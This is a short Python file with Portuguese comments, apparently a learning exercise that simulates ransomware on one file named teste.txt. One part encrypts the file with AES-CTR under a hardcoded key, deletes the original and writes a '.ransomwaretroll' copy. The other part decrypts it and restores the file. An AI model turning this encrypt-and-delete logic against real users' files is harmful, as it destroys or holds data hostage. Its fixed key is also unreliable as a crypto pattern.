#criptografia
import os
import pyaes


file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()


os.remove(file_name)


key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)


crypto_data = aes.encrypt(file_data)


new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()

#descriptografia
import os
import pyaes

## abrir o arquivo criptografado
file_name = "teste.txt.ransomwaretroll"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## chave para descriptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)
decrypt_data = aes.decrypt(file_data)

## remover o arquivo criptografado
os.remove(file_name)

## criar o arquivo descriptografado
new_file = "teste.txt"
new_file = open(f'{new_file}', "wb")
new_file.write(decrypt_data)
new_file.close()



#arquivo

arquivo liberado 
